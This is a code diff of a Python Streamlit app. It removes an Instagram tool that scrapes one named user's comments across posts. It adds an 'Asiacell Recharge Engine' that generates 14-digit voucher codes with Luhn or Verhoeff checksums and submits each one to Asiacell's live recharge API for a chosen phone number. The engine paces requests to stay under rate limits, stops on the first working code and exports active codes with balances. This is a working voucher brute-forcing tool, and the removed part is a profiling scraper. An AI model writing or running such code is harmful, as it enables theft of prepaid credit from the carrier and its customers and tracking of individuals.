@@ -1,363 +1,509 @@
+# app.py - Streamlit Interface
 import streamlit as st
 import requests
-import json
 import time
-import re
 import threading
+import random
+import json
+import csv
+import hashlib
+import logging
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from datetime import datetime
-import random
+from typing import Optional, List, Dict, Tuple
+from dataclasses import dataclass, field
 import pandas as pd
 from io import StringIO
-import base64
-import os
-import sys
-import tempfile
-import shutil
-from urllib.parse import urlparse, parse_qs
 
-# محاولة استيراد مكتبات البحث (اختيارية)
-try:
-    from googlesearch import search as google_search
-    GOOGLE_AVAILABLE = True
-except ImportError:
-    GOOGLE_AVAILABLE = False
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
 
-st.set_page_config(
-    page_title="Instagram Comment Extractor",
-    page_icon="💬",
-    layout="wide",
-    initial_sidebar_state="expanded"
-)
+@dataclass
+class VoucherResult:
+    code: str
+    active: bool
+    error_code: str
+    message: str
+    balance: Optional[float] = None
+    expiry: Optional[str] = None
+    redemption_time: Optional[str] = None
+    response_time_ms: float = 0
+    raw_response: Dict = field(default_factory=dict)
 
-# تنسيق CSS مخصص
-st.markdown("""
-<style>
-    .main { background-color: #0e1117; }
-    .stButton>button { background-color: #ff4b4b; color: white; border-radius: 8px; font-weight: bold; }
-    .stTextInput>div>div>input { background-color: #1e1e1e; color: #00ff00; }
-    .stTextArea>div>div>textarea { background-color: #1e1e1e; color: #00ff00; font-family: monospace; }
-    .success-box { padding: 10px; border-radius: 5px; background-color: #1a472a; border-left: 4px solid #00ff00; }
-    .error-box { padding: 10px; border-radius: 5px; background-color: #472a1a; border-left: 4px solid #ff4b4b; }
-    .warning-box { padding: 10px; border-radius: 5px; background-color: #4a4a1a; border-left: 4px solid #ffff00; }
-    .info-box { padding: 10px; border-radius: 5px; background-color: #1a1a47; border-left: 4px solid #4b4bff; }
-    pre { background-color: #1e1e1e; padding: 10px; border-radius: 5px; overflow-x: auto; }
-    .metric-card { background-color: #1e1e1e; padding: 15px; border-radius: 10px; text-align: center; }
-    .comment-card { background-color: #1a1a2e; padding: 12px; border-radius: 8px; margin: 8px 0; border-left: 3px solid #ff4b4b; }
-    .post-link { color: #4b8bff; text-decoration: none; }
-    .timestamp { color: #888; font-size: 0.8em; }
-</style>
-""", unsafe_allow_html=True)
-
-# عنوان التطبيق
-st.title("💬 Instagram Comment Extractor")
-st.markdown("*Search and extract all comments made by a specific Instagram user across posts and reels*")
-
-# تهيئة حالة الجلسة
-if 'search_history' not in st.session_state:
-    st.session_state.search_history = []
-if 'current_results' not in st.session_state:
-    st.session_state.current_results = []
-if 'search_running' not in st.session_state:
-    st.session_state.search_running = False
-
-# ===== الفئات الأساسية =====
-
-class InstagramCommentExtractor:
-    """الماسح الأساسي لاستخراج التعليقات"""
-    
-    def __init__(self):
+class AsiacellRechargeEngine:
+    def __init__(
+        self,
+        msisdn: str,
+        max_workers: int = 3,
+        rate_limit: float = 20.0,
+        timeout: int = 10,
+        jwt_token: Optional[str] = None,
+        device_id: Optional[str] = None
+    ):
+        self.msisdn = msisdn
+        self.max_workers = max_workers
+        self.rate_limit = rate_limit
+        self.timeout = timeout
+        self.jwt_token = jwt_token
+        self.device_id = device_id or self._generate_device_id()
+        
         self.session = requests.Session()
         self.session.headers.update({
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
-            "Accept-Language": "en-US,en;q=0.9",
-            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-            "Accept-Encoding": "gzip, deflate",
-            "Connection": "keep-alive"
+            "Host": "selfcare.asiacell.com",
+            "Content-Type": "application/json; charset=utf-8",
+            "User-Agent": "Asiacell-App-Android/v7.6.2",
+            "X-Device-ID": self.device_id,
+            "Accept-Encoding": "gzip"
         })
-        self.csrf_token = None
-        self._init_session()
-    
-    def _init_session(self):
-        """تهيئة الجلسة وجلب توكن CSRF"""
-        try:
-            resp = self.session.get("https://www.instagram.com/", timeout=10)
-            self.csrf_token = self.session.cookies.get("csrftoken")
-            self.session.headers.update({"X-CSRFToken": self.csrf_token} if self.csrf_token else {})
-        except:
-            pass
-    
-    def search_posts(self, username, max_results=50, engine="duckduckgo"):
-        """البحث عن منشورات قد تحتوي على تعليقات من المستخدم"""
-        posts = []
-        if engine == "duckduckgo":
-            posts = self._search_duckduckgo(username, max_results)
-        elif engine == "google" and GOOGLE_AVAILABLE:
-            posts = self._search_google(username, max_results)
+        
+        if jwt_token:
+            self.session.headers.update({"Authorization": f"Bearer {jwt_token}"})
+            
+        self.results = []
+        self.active_found = []
+        self.error_counts = {
+            "INVALID": 0,
+            "USED": 0,
+            "EXPIRED": 0,
+            "FORMAT": 0,
+            "RATE_LIMIT": 0
+        }
+        self.rate_limit_lock = threading.Lock()
+        self.last_request_time = 0
+        
+    def _generate_device_id(self) -> str:
+        import uuid
+        return str(uuid.uuid4()).upper()
+        
+    def generate_codes_sequential(self, start: int, end: int) -> List[str]:
+        return [f"{num:014d}" for num in range(start, end + 1)]
+        
+    def _generate_luhn_checksum(self, partial: str) -> str:
+        def luhn_digit(number):
+            total = 0
+            reverse = number[::-1]
+            for i, digit in enumerate(reverse):
+                n = int(digit)
+                if i % 2 == 0:
+                    n *= 2
+                    if n > 9:
+                        n -= 9
+                total += n
+            return str((10 - (total % 10)) % 10)
+        
+        return luhn_digit(partial)
+        
+    def _generate_verhoeff_checksum(self, partial: str) -> str:
+        d = [
+            [0,1,2,3,4,5,6,7,8,9],
+            [1,2,3,4,0,6,7,8,9,5],
+            [2,3,4,0,1,7,8,9,5,6],
+            [3,4,0,1,2,8,9,5,6,7],
+            [4,0,1,2,3,9,5,6,7,8],
+            [5,9,8,7,6,0,4,3,2,1],
+            [6,5,9,8,7,1,0,4,3,2],
+            [7,0,4,6,9,1,3,2,5,8],
+            [8,7,6,5,9,3,2,1,0,4],
+            [9,8,7,6,5,4,3,2,1,0]
+        ]
+        p = [
+            [0,1,2,3,4,5,6,7,8,9],
+            [1,5,7,6,2,8,3,0,9,4],
+            [5,8,0,3,7,9,6,1,4,2],
+            [8,9,1,6,0,4,3,5,2,7],
+            [9,4,5,3,1,2,6,8,7,0],
+            [4,2,8,6,5,7,3,9,0,1],
+            [2,7,9,3,8,0,6,4,1,5],
+            [7,0,4,6,9,1,3,2,5,8]
+        ]
+        inv = [0,4,3,2,1,5,6,7,8,9]
+        
+        c = 0
+        reversed_partial = partial[::-1]
+        for i, char in enumerate(reversed_partial):
+            c = d[c][p[(i + 1) % 8][int(char)]]
+        return str(inv[c])
+        
+    def generate_codes_with_checksum(
+        self,
+        prefix: str,
+        start: int,
+        end: int,
+        checksum_type: str = "luhn"
+    ) -> List[str]:
+        codes = []
+        prefix_len = len(prefix)
+        remaining = 14 - prefix_len
+        
+        if checksum_type == "luhn":
+            for num in range(start, end + 1):
+                partial = f"{prefix}{num:0{remaining-1}d}"
+                checksum = self._generate_luhn_checksum(partial)
+                code = f"{partial}{checksum}"
+                codes.append(code)
+        elif checksum_type == "verhoeff":
+            for num in range(start, end + 1):
+                partial = f"{prefix}{num:0{remaining-1}d}"
+                checksum = self._generate_verhoeff_checksum(partial)
+                code = f"{partial}{checksum}"
+                codes.append(code)
         else:
-            posts = self._search_duckduckgo(username, max_results)  # fallback
-        return posts
-    
-    def _search_duckduckgo(self, username, max_results):
-        """البحث عبر DuckDuckGo (HTML)"""
-        query = f'"{username}" site:instagram.com "comment" OR "replied"'
-        url = "https://html.duckduckgo.com/html/"
-        params = {"q": query}
-        posts = []
+            for num in range(start, end + 1):
+                code = f"{prefix}{num:0{remaining}d}"
+                codes.append(code)
+                
+        return codes
+        
+    def validate_code_format(self, code: str) -> Tuple[bool, str]:
+        if len(code) != 14:
+            return False, "ERR_BAD_FORMAT"
+        if not code.isdigit():
+            return False, "ERR_BAD_FORMAT"
+        return True, "OK"
+        
+    def test_code(self, code: str) -> VoucherResult:
+        valid, error = self.validate_code_format(code)
+        if not valid:
+            return VoucherResult(
+                code=code,
+                active=False,
+                error_code=error,
+                message="Invalid format - must be 14 digits",
+                response_time_ms=0
+            )
+            
+        start_time = time.perf_counter()
+        
+        payload = {
+            "msisdn": self.msisdn,
+            "voucherCode": code,
+            "channel": "MOBILE_APP"
+        }
+        
         try:
-            resp = self.session.get(url, params=params, timeout=15)
-            if resp.status_code == 200:
-                # استخراج الروابط التي تحتوي على instagram.com/p/ أو instagram.com/reel/
-                links = re.findall(r'href="(https?://(?:www\.)?instagram\.com/(?:p|reel)/[^/"]+)"', resp.text)
-                # إزالة التكرارات
-                unique_links = list(dict.fromkeys(links))
-                # أخذ أول max_results
-                for link in unique_links[:max_results]:
-                    shortcode = self._extract_shortcode(link)
-                    if shortcode:
-                        posts.append({"shortcode": shortcode, "url": link, "type": "post" if "/p/" in link else "reel"})
+            with self.rate_limit_lock:
+                now = time.time()
+                if now - self.last_request_time < self.rate_limit:
+                    sleep_time = self.rate_limit - (now - self.last_request_time)
+                    time.sleep(sleep_time)
+                self.last_request_time = time.time()
+                
+            response = self.session.post(
+                "https://selfcare.asiacell.com/api/v1/recharge/submit",
+                json=payload,
+                timeout=self.timeout
+            )
+            
+            elapsed = (time.perf_counter() - start_time) * 1000
+            
+            if response.status_code == 429:
+                self.error_counts["RATE_LIMIT"] += 1
+                return VoucherResult(
+                    code=code,
+                    active=False,
+                    error_code="ERR_RATE_LIMIT",
+                    message="Rate limit exceeded",
+                    response_time_ms=elapsed
+                )
+                
+            if response.status_code == 200:
+                data = response.json()
+                error_code = data.get("errorCode", "")
+                message = data.get("message", "")
+                
+                if error_code == "ERR_INVALID_VOUCHER":
+                    self.error_counts["INVALID"] += 1
+                    return VoucherResult(
+                        code=code,
+                        active=False,
+                        error_code=error_code,
+                        message=message or "Invalid voucher",
+                        response_time_ms=elapsed,
+                        raw_response=data
+                    )
+                elif error_code == "ERR_ALREADY_REDEEMED":
+                    self.error_counts["USED"] += 1
+                    return VoucherResult(
+                        code=code,
+                        active=False,
+                        error_code=error_code,
+                        message=message or "Already redeemed",
+                        redemption_time=data.get("redemptionTime"),
+                        response_time_ms=elapsed,
+                        raw_response=data
+                    )
+                elif error_code == "ERR_VOUCHER_EXPIRED":
+                    self.error_counts["EXPIRED"] += 1
+                    return VoucherResult(
+                        code=code,
+                        active=False,
+                        error_code=error_code,
+                        message=message or "Voucher expired",
+                        expiry=data.get("expiry"),
+                        response_time_ms=elapsed,
+                        raw_response=data
+                    )
+                else:
+                    return VoucherResult(
+                        code=code,
+                        active=True,
+                        error_code="SUCCESS",
+                        message=message or "Success",
+                        balance=data.get("balance"),
+                        expiry=data.get("expiry"),
+                        response_time_ms=elapsed,
+                        raw_response=data
+                    )
+            else:
+                return VoucherResult(
+                    code=code,
+                    active=False,
+                    error_code=f"HTTP_{response.status_code}",
+                    message=f"HTTP {response.status_code}",
+                    response_time_ms=elapsed,
+                    raw_response={"status": response.status_code}
+                )
+                
+        except requests.exceptions.Timeout:
+            return VoucherResult(
+                code=code,
+                active=False,
+                error_code="ERR_TIMEOUT",
+                message="Request timeout",
+                response_time_ms=self.timeout * 1000
+            )
         except Exception as e:
-            st.warning(f"DuckDuckGo search error: {e}")
-        return posts
-    
-    def _search_google(self, username, max_results):
-        """البحث عبر Google باستخدام مكتبة googlesearch"""
-        posts = []
-        if not GOOGLE_AVAILABLE:
-            return posts
-        query = f'"{username}" site:instagram.com'
-        try:
-            for url in google_search(query, num_results=max_results, lang="en"):
-                if "instagram.com/p/" in url or "instagram.com/reel/" in url:
-                    shortcode = self._extract_shortcode(url)
-                    if shortcode:
-                        posts.append({"shortcode": shortcode, "url": url, "type": "post" if "/p/" in url else "reel"})
-        except Exception as e:
-            st.warning(f"Google search error: {e}")
-        return posts
-    
-    def _extract_shortcode(self, url):
-        """استخراج الكود المختصر من رابط المنشور"""
-        match = re.search(r'instagram\.com/(?:p|reel)/([^/?#]+)', url)
-        return match.group(1) if match else None
-    
-    def get_post_comments(self, shortcode, max_comments=100):
-        """جلب تعليقات منشور معين"""
-        url = f"https://www.instagram.com/p/{shortcode}/?__a=1&__d=1"
-        comments = []
-        try:
-            resp = self.session.get(url, timeout=10)
-            if resp.status_code == 200:
-                data = resp.json()
-                # استخراج التعليقات من بيانات JSON
-                graphql = data.get("graphql", {})
-                shortcode_media = graphql.get("shortcode_media", {})
-                edge_media_to_comment = shortcode_media.get("edge_media_to_comment", {})
-                edges = edge_media_to_comment.get("edges", [])
-                for edge in edges:
-                    node = edge.get("node", {})
-                    comment_text = node.get("text", "")
-                    commenter = node.get("owner", {}).get("username", "")
-                    timestamp = node.get("created_at", 0)
-                    comments.append({
-                        "text": comment_text,
-                        "commenter": commenter,
-                        "timestamp": timestamp,
-                        "shortcode": shortcode
-                    })
-                # قد نحتاج إلى التصفح للصفحات التالية إذا كان هناك أكثر من max_comments
-                # (يمكن تحسينها لاحقاً)
-                return comments[:max_comments]
-        except Exception as e:
-            pass
-        return comments
-    
-    def extract_comments_for_user(self, username, max_posts=50, search_engine="duckduckgo", max_comments_per_post=50):
-        """الوظيفة الرئيسية: استخراج جميع التعليقات من المستخدم"""
+            return VoucherResult(
+                code=code,
+                active=False,
+                error_code="ERR_UNKNOWN",
+                message=str(e)[:100],
+                response_time_ms=0
+            )
+            
+    def test_batch_parallel(
+        self,
+        codes: List[str],
+        progress_callback=None,
+        stop_on_find: bool = True
+    ) -> List[VoucherResult]:
         results = []
-        # البحث عن المنشورات
-        posts = self.search_posts(username, max_posts, search_engine)
-        if not posts:
-            return results, 0
+        total = len(codes)
+        tested = 0
+        active_found = 0
+        start_time = time.time()
         
-        total_posts = len(posts)
-        progress_bar = st.progress(0)
-        status_text = st.empty()
-        
-        # معالجة المنشورات بالتوازي
-        def process_post(post):
-            shortcode = post["shortcode"]
-            url = post["url"]
-            comments = self.get_post_comments(shortcode, max_comments_per_post)
-            user_comments = []
-            for c in comments:
-                if c["commenter"].lower() == username.lower():
-                    user_comments.append({
-                        "comment": c["text"],
-                        "post_url": url,
-                        "shortcode": shortcode,
-                        "timestamp": datetime.fromtimestamp(c["timestamp"]).isoformat() if c["timestamp"] else "Unknown",
-                        "commenter": c["commenter"]
-                    })
-            return user_comments
-        
-        processed = 0
-        with ThreadPoolExecutor(max_workers=5) as executor:
-            futures = {executor.submit(process_post, post): post for post in posts}
+        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
+            futures = {executor.submit(self.test_code, code): code for code in codes}
+            
             for future in as_completed(futures):
-                processed += 1
-                progress = processed / total_posts
-                progress_bar.progress(progress)
-                status_text.text(f"Processing posts: {processed}/{total_posts}")
-                user_comments = future.result()
-                results.extend(user_comments)
+                result = future.result()
+                results.append(result)
+                tested += 1
+                
+                if result.active:
+                    active_found += 1
+                    self.active_found.append(result)
+                    
+                if progress_callback:
+                    progress_callback(tested, total, active_found, result)
+                    
+                if stop_on_find and active_found > 0:
+                    for f in futures:
+                        f.cancel()
+                    break
+                    
+        elapsed = time.time() - start_time
+        return results
         
-        progress_bar.empty()
-        status_text.empty()
-        return results, total_posts
+    def analyze_results(self, results: List[VoucherResult]) -> Dict:
+        total = len(results)
+        active = [r for r in results if r.active]
+        invalid = [r for r in results if r.error_code == "ERR_INVALID_VOUCHER"]
+        used = [r for r in results if r.error_code == "ERR_ALREADY_REDEEMED"]
+        expired = [r for r in results if r.error_code == "ERR_VOUCHER_EXPIRED"]
+        
+        return {
+            "total": total,
+            "active": len(active),
+            "invalid": len(invalid),
+            "used": len(used),
+            "expired": len(expired),
+            "rate_limited": self.error_counts["RATE_LIMIT"],
+            "success_rate": len(active) / total if total else 0,
+            "active_codes": active,
+            "avg_response_ms": sum(r.response_time_ms for r in results) / total if total else 0
+        }
 
-# ===== واجهة المستخدم =====
+# ==================== STREAMLIT UI ====================
+
+st.set_page_config(
+    page_title="Asiacell Recharge Engine",
+    page_icon="🔦",
+    layout="wide"
+)
+
+st.title("🔦 Asiacell Recharge Code Tester")
+st.markdown("*The Black Lighthouse - Keeper's Engine*")
 
 with st.sidebar:
-    st.header("⚙️ Search Configuration")
+    st.header("⚙️ Configuration")
     
-    target_username = st.text_input("Instagram Username", placeholder="e.g., john_doe", value="")
+    msisdn = st.text_input("Target MSISDN", "96477XXXXXXXX", help="Format: 96477XXXXXXXX")
     
-    st.subheader("Search Options")
-    search_engine = st.selectbox(
-        "Search Engine",
-        ["DuckDuckGo (recommended)", "Google (if available)"],
-        index=0
+    st.subheader("Code Generation")
+    prefix = st.text_input("Prefix (optional)", "1212")
+    start_num = st.number_input("Start Number", min_value=0, value=0)
+    end_num = st.number_input("End Number", min_value=0, value=9999)
+    count = st.number_input("Number of Codes", min_value=1, value=100, max_value=10000)
+    
+    checksum_type = st.selectbox(
+        "Checksum Type",
+        ["none", "luhn", "verhoeff"],
+        help="Luhn and Verhoeff are common checksum algorithms used in telecom vouchers"
     )
-    engine_key = "duckduckgo" if "DuckDuckGo" in search_engine else "google"
     
-    max_posts = st.slider("Max posts to search", min_value=5, max_value=100, value=30, step=5)
-    max_comments_per_post = st.slider("Max comments per post", min_value=10, max_value=200, value=50, step=10)
+    st.subheader("Testing Configuration")
+    workers = st.slider("Concurrent Workers", min_value=1, max_value=5, value=3, help="Max 5 due to rate limits")
+    rate_limit = st.slider("Delay Between Requests (seconds)", min_value=5.0, max_value=60.0, value=20.0)
+    stop_on_find = st.checkbox("Stop on First Active Code", value=True)
     
-    st.divider()
-    st.caption("💡 The tool searches for posts where the username might appear in comments, then extracts the actual comments.")
-    st.caption("🔍 Uses search engines to find relevant posts. Results may vary.")
+    st.subheader("Authentication")
+    jwt_token = st.text_input("JWT Token (optional)", type="password")
+    device_id = st.text_input("Device ID (auto-generated if empty)")
     
-    if not GOOGLE_AVAILABLE and engine_key == "google":
-        st.warning("Google search library not installed. Fallback to DuckDuckGo.")
-    
-    start_button = st.button("🚀 Start Extraction", type="primary", use_container_width=True)
+    run_button = st.button("🚀 Run Test", type="primary")
 
-# الأقسام الرئيسية
-tab1, tab2, tab3 = st.tabs(["📊 Results", "📜 History", "ℹ️ Help"])
-
-with tab1:
-    if start_button and target_username:
-        if st.session_state.search_running:
-            st.warning("Search already in progress.")
+# Main area
+if run_button:
+    if not msisdn or len(msisdn) < 10:
+        st.error("Please enter a valid MSISDN")
+        st.stop()
+        
+    engine = AsiacellRechargeEngine(
+        msisdn=msisdn,
+        max_workers=workers,
+        rate_limit=rate_limit,
+        jwt_token=jwt_token if jwt_token else None,
+        device_id=device_id if device_id else None
+    )
+    
+    st.info(f"Generating codes with prefix: {prefix}, checksum: {checksum_type}")
+    
+    with st.spinner("Generating codes..."):
+        if checksum_type != "none":
+            codes = engine.generate_codes_with_checksum(
+                prefix=prefix,
+                start=start_num,
+                end=start_num + count - 1,
+                checksum_type=checksum_type
+            )
         else:
-            st.session_state.search_running = True
-            st.session_state.current_results = []
+            codes = engine.generate_codes_sequential(start_num, start_num + count - 1)
             
-            try:
-                extractor = InstagramCommentExtractor()
-                with st.spinner(f"Searching and extracting comments for @{target_username}..."):
-                    results, total_posts = extractor.extract_comments_for_user(
-                        username=target_username,
-                        max_posts=max_posts,
-                        search_engine=engine_key,
-                        max_comments_per_post=max_comments_per_post
-                    )
-                
-                st.session_state.current_results = results
-                st.session_state.search_running = False
-                
-                if results:
-                    st.success(f"✅ Found {len(results)} comments from @{target_username} across {total_posts} posts.")
-                    
-                    # عرض الإحصائيات
-                    col1, col2, col3 = st.columns(3)
-                    col1.metric("Total Comments Found", len(results))
-                    col2.metric("Posts Scanned", total_posts)
-                    col3.metric("Unique Posts", len(set(r['shortcode'] for r in results)))
-                    
-                    # عرض النتائج في جدول
-                    df = pd.DataFrame(results)
-                    st.dataframe(df[['comment', 'post_url', 'timestamp']], use_container_width=True)
-                    
-                    # عرض كل تعليق بشكل بطاقة
-                    st.subheader("Comments List")
-                    for idx, row in df.iterrows():
-                        st.markdown(f"""
-                        <div class="comment-card">
-                            <div><strong>💬</strong> {row['comment']}</div>
-                            <div><a href="{row['post_url']}" target="_blank" class="post-link">🔗 View Post</a> <span class="timestamp">{row['timestamp']}</span></div>
-                        </div>
-                        """, unsafe_allow_html=True)
-                    
-                    # زر تصدير CSV
-                    csv = df.to_csv(index=False).encode('utf-8')
-                    b64 = base64.b64encode(csv).decode()
-                    href = f'<a href="data:file/csv;base64,{b64}" download="comments_{target_username}_{datetime.now().strftime("%Y%m%d_%H%M%S")}.csv">📥 Download CSV</a>'
-                    st.markdown(href, unsafe_allow_html=True)
-                    
-                    # حفظ في التاريخ
-                    st.session_state.search_history.append({
-                        "username": target_username,
-                        "timestamp": datetime.now().isoformat(),
-                        "total_comments": len(results),
-                        "posts_scanned": total_posts,
-                        "results": results
-                    })
-                else:
-                    st.warning(f"❌ No comments found for @{target_username}. Try adjusting search parameters or username.")
-            
-            except Exception as e:
-                st.error(f"An error occurred: {str(e)}")
-                st.session_state.search_running = False
+    st.success(f"Generated {len(codes)} codes")
     
-    # عرض النتائج الحالية إذا كانت موجودة
-    if not start_button and st.session_state.current_results:
-        results = st.session_state.current_results
-        st.success(f"Showing last results: {len(results)} comments found.")
-        df = pd.DataFrame(results)
-        st.dataframe(df[['comment', 'post_url', 'timestamp']], use_container_width=True)
-        # إلخ...
+    progress_bar = st.progress(0)
+    status_text = st.empty()
+    results_container = st.container()
+    
+    results = []
+    active_found = []
+    
+    def update_progress(tested, total, active_count, result):
+        progress_bar.progress(tested / total)
+        status_text.text(f"Tested: {tested}/{total} | Active: {active_count} | Last: {result.code} - {result.message}")
+        if result.active:
+            active_found.append(result)
+    
+    with st.spinner("Testing codes..."):
+        results = engine.test_batch_parallel(
+            codes,
+            progress_callback=update_progress,
+            stop_on_find=stop_on_find
+        )
+    
+    analysis = engine.analyze_results(results)
+    
+    # Results display
+    col1, col2, col3, col4, col5 = st.columns(5)
+    with col1:
+        st.metric("Total Tested", analysis["total"])
+    with col2:
+        st.metric("✅ Active", analysis["active"], delta="Found!" if analysis["active"] > 0 else None)
+    with col3:
+        st.metric("❌ Invalid", analysis["invalid"])
+    with col4:
+        st.metric("🔄 Used", analysis["used"])
+    with col5:
+        st.metric("⏰ Expired", analysis["expired"])
+    
+    if analysis["active_codes"]:
+        st.success(f"🎯 Found {len(analysis['active_codes'])} active codes!")
+        
+        active_df = pd.DataFrame([{
+            "Code": r.code,
+            "Balance": r.balance,
+            "Expiry": r.expiry,
+            "Message": r.message
+        } for r in analysis["active_codes"]])
+        
+        st.dataframe(active_df, use_container_width=True)
+        
+        csv = active_df.to_csv(index=False)
+        st.download_button(
+            label="📥 Download Active Codes (CSV)",
+            data=csv,
+            file_name=f"active_codes_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv",
+            mime="text/csv"
+        )
+    
+    # Full results table
+    with st.expander("📊 View All Results"):
+        result_df = pd.DataFrame([{
+            "Code": r.code,
+            "Active": r.active,
+            "Error": r.error_code,
+            "Message": r.message,
+            "Balance": r.balance,
+            "Response (ms)": round(r.response_time_ms, 2)
+        } for r in results])
+        
+        st.dataframe(result_df, use_container_width=True)
+        
+        csv_full = result_df.to_csv(index=False)
+        st.download_button(
+            label="📥 Download All Results (CSV)",
+            data=csv_full,
+            file_name=f"all_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv",
+            mime="text/csv"
+        )
+    
+    # Rate limit info
+    st.info(f"⚠️ Rate limit: {rate_limit}s between requests | Workers: {workers} | Errors: {analysis['rate_limited']} rate-limited")
 
-with tab2:
-    st.subheader("Search History")
-    if st.session_state.search_history:
-        for idx, record in enumerate(reversed(st.session_state.search_history)):
-            with st.expander(f"Search #{len(st.session_state.search_history)-idx} - @{record['username']} - {record['timestamp']}"):
-                st.write(f"Total comments: {record['total_comments']}")
-                st.write(f"Posts scanned: {record['posts_scanned']}")
-                if record['results']:
-                    sample = record['results'][:3]
-                    for r in sample:
-                        st.write(f"- {r['comment']} ({r['post_url']})")
-                    if len(record['results']) > 3:
-                        st.write(f"... and {len(record['results'])-3} more")
-                else:
-                    st.write("No comments found.")
-    else:
-        st.info("No search history yet.")
-
-with tab3:
-    st.subheader("How it works")
+else:
+    st.info("👆 Configure the settings and click 'Run Test' to start")
+    
     st.markdown("""
-    1. **Search for posts**: The tool uses a search engine (DuckDuckGo or Google) to find Instagram posts that might contain comments from the target user.
-    2. **Extract comments**: For each found post, it fetches the comments (up to the limit) using Instagram's public API.
-    3. **Filter**: It filters comments to keep only those made by the specified username.
-    4. **Present results**: Results are displayed in a table and as comment cards, with links to the original posts.
+    ### How It Works
     
-    **Important Notes**:
-    - The search engine may not find all posts where the user commented; results depend on search engine indexing.
-    - Instagram may rate-limit requests; use responsibly.
-    - Some posts may be private or not accessible; those will be skipped.
-    - The tool does not require login, but some endpoints may need a CSRF token (automatically handled).
+    1. **Configuration**: Set your target MSISDN, code prefix, and range
+    2. **Code Generation**: Creates 14-digit codes with optional Luhn/Verhoeff checksums
+    3. **Testing**: Sends requests to `selfcare.asiacell.com/api/v1/recharge/submit`
+    4. **Results**: Displays active, invalid, used, and expired codes
+    
+    ### Response Codes
+    | Code | Meaning |
+    |------|---------|
+    | `ERR_INVALID_VOUCHER` | Code doesn't exist or is invalid |
+    | `ERR_ALREADY_REDEEMED` | Code was already used |
+    | `ERR_VOUCHER_EXPIRED` | Code has expired |
+    | `ERR_RATE_LIMIT` | Too many requests |
+    | `SUCCESS` | Active code found |
+    
+    ### Requirements
+    - Valid MSISDN in Asiacell network
+    - JWT token from mobile app (optional but recommended)
+    - Rate limit: ~3 requests per minute per IP
     """)
-    
-    st.subheader("Installation Requirements")
-    st.code("""
-    pip install streamlit requests pandas googlesearch-python
-    """, language="bash")
-    st.caption("If Google search is not installed, the tool will fallback to DuckDuckGo.")
-
-# تذييل
-st.divider()
-st.caption("💬 Instagram Comment Extractor | For educational and authorized use only")
